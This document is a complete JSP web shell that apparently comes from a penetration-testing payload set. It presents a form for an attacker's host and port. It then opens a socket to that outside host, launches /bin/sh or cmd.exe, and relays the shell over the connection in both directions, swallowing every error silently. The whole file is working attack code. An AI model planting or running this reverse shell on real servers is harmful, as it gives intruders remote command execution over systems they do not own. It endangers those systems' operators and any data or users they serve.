<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<form method="post">
LHOST: <input type="text" name="ip"   size=12 placeholder="HOSTHOST"><br />
LPORT: <input type="text" name="port" size=12 placeholder="PORTPORT"><br />
<input type="submit" name="Connect" value="Connect"><br />
</form>

<%
String ipAddress = request.getParameter("ip");
String ipPort = request.getParameter("port");

if(ipAddress != null && ipPort != null){

    class StreamConnector extends Thread
    {
        InputStream is;
        OutputStream os;

        StreamConnector( InputStream is, OutputStream os )
        {
        this.is = is;
        this.os = os;
        }

        public void run()
        {
        BufferedReader in  = null;
        BufferedWriter out = null;
try
{
    in  = new BufferedReader( new InputStreamReader( this.is ) );
    out = new BufferedWriter( new OutputStreamWriter( this.os ) );
    char buffer[] = new char[8192];
    int length;
    while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
    {
        out.write( buffer, 0, length );
        out.flush();
    }
} catch( Exception e ){}
try
{
    if( in != null )
        in.close();
    if( out != null )
        out.close();
} catch( Exception e ){}
        }
    }

      try
      {
        String ShellPath;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
      ShellPath = new String("/bin/sh");
    } else {
      ShellPath = new String("cmd.exe");
    }

        Socket socket = new Socket( ipAddress,(new Integer(ipPort)).intValue());
        Process process = Runtime.getRuntime().exec( ShellPath );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
      } catch( Exception e ) {}
}
%>
